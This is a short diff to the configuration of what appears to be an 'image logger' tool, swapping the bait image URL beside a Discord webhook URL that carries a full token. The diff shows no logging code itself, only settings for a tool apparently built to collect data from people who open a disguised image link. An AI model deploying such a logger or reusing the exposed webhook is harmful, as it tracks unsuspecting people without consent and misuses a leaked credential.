@@ -13,7 +13,7 @@ __author__ = "tioyoshi"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1152675299524346066/1xolv240jxLOCADC9fE7wz7y3YjyrOTnya63ef72eGDbxHqMji4-QyRZkUcYrtYnlES3",
-    "image": "https://cdn.discordapp.com/attachments/1134241693286289542/1162186095245668352/image.png?ex=653b0525&is=65289025&hm=1ac659b3f5c7446bb4bac5cb245f7b16ce31876bc03ba36ecd625760f59c15f4&", # You can also have a custom image by using a URL argument
+    "image": "https://files.catbox.moe/f52ptu.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
